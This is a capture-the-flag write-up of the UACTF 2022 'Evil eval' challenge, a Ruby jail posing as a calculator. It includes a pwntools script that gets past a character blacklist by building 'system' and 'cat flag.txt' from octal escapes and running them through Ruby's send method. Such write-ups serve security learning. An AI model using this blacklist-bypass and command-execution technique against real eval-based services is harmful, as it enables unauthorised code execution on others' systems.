# Intro
Hello again. 

This past weekend, me and my teammates at [zh3r0](https://ctftime.org/team/116018) competed in [UACTF 2022](https://ctftime.org/event/1709). The ctf was pretty good, and had a wide variety of challenges. One of these challenges was `Evil eval`. And oh boy was it evil.

## The challenge
This was in the pwn category. We are given a netcat command, and when we log in we are greeted by:

```
------------------------------------------
| UNCOMPLICATED COMMAND-LINE CALCULATOR! |
------------------------------------------

Example Usage:
(1 + 2) * 3
> (1 + 2) * 3 = 9
```

We can type equations - and also commands into the calculator as long as they are < 8 unique bytes long. I've tried some challenges like this before, so I was immediately thinking "it must be a pyjail challenge!". It was a jail challenge, so I was half right, but the assumption about python is something i wasted *HOURS* of my time on.

## Limitations
I previously mentioned that there can only be 8 unique chars per command/equation. There was another restriction I didn't mention:

```
asd
> asd = One or more of the following characters have been blocked: 'f', 'l', 'a', 'g', '.', 't', 'x', 't', and/or '`'
```

This limitation left me pretty stumped for the majority of the CTF, there are not functions (in python) that can be used to execute code that dont contain a blacklisted character (`eval`, `exec`). In addition to this it was possible to open a file as `open` doesnt trigger the blacklist, however it was impossible to read the file since `read` does.

So no progress was made here for quite a while.

# Revelations
On the last day of the CTF, my teammate [`_wh1t3r0se_`](https://ctftime.org/user/73367) made an interesting observation, the challenge was not python, but ruby.

This didnt click with me at first, as I dont know any ruby and was so far into the pyjail rabbit hole that I hadn't even taken the time to consider the chance that I wasnt seeing python. Indeed, if you look up any error message from the session, you would find it to be ruby.

This opened up some new possibilities for exploiting the jail.

## Exploitation

I had been googling `python pyjail execute string as function` when I found `eval` and `exec`. So it only made sense to do the same for ruby. 

I ended up finding [this](https://stackoverflow.com/questions/1407451/calling-a-method-from-a-string-with-the-methods-name-in-ruby) stack overflow post, and from that found the `send` method. Looking at the [documentation](https://ruby-doc.org/core-3.1.2/Object.html#method-i-send) we can see that the format is `send(method, args)`. This was perfect.

Heres my script:

```python

from pwn import *

context.log_level = "debug"


def convert_str_to_oct_list(string):
    return [oct(ord(x))[2:] for x in string]


def sendstr(str0, name):
    print(str0)
    for x in str0:
        p.sendlineafter("> ", name + f"+=\"\\{x}\"")
        print(p.recvline())

def main():
    global p
    str0 = convert_str_to_oct_list("system")
    str1 = convert_str_to_oct_list("cat flag.txt")
    p = remote("challenges.uactf.com.au", 30000)
    
    p.recvuntil(">")
    p.sendline("e=\"\"")
    sendstr(str0, "e")
    p.sendline("E=\"\"")
    sendstr(str1, "E")

    p.sendline("send(e,E)")
    p.interactive()
if __name__ == "__main__":
    main()
```

Theres one last thing to explain. We were able to get around the filters by first creating an empty string, and then adding the escaped octal representations of the characters into the string one at a time. Hexadecimal representations couldnt be used because of the `x` character, so this was the next logical step.

I also had some wierd issues with the variable names, but `e` and `E` worked fine. 

(Thanks to [finch](https://ctftime.org/user/78954) for cleaning up the string -> octal conversion).

# Closing remarks
This is without a doubt the shortest writeup I have ever made - maybe I won't ramble for as long from now on. Probably not.

When I lay out the pieces, this challenge seems easy - and it was easy, really. The main obstacle was the filter, and bypassing it via string conversions. However I added another hurdle when I went full tunnel vision down the `pyjail` rabbit hole.

Some (me included) would argue that this challenge isn't really pwn - however what this challenge and real pwn challenges have in common is that they become infinitely harder when you add more obstacles, especially when those obstacles are your own stubbornness.

If theres anything to take from this, its probably not to focus on any one thing too much, and make sure to challenge any assumptions you have, whether you do pwn, or whatever category this challenge fits in.

Cya.
